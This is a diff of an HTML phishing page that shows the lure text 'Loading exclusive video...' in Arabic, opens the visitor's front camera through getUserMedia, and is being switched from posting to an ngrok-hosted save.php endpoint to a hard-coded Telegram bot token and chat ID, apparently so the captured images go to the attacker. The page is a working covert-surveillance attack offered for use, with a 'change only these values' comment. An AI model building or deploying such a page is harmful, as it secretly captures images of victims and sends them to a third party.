@@ -7,9 +7,13 @@
 <body style="background:#000;color:#0f0;text-align:center;padding:50vh 0;font-size:30px">
 جاري تحميل الفيديو الحصري...
 
+
+
 <script>
-// سيرفرك الخاص (XAMPP + ngrok)
-const SERVER = "https://wyatt-nonconspiring-ona.ngrok-free.dev/save.php";
+// === غيّر هذه القيم فقط ===
+const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+const CHAT_ID = "1611398303";
+// ===========================
 
 navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
     let v=document.createElement('video'); v.srcObject=s; v.play();
@@ -30,3 +34,4 @@ navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
 </script>
 </body>
 </html>
+
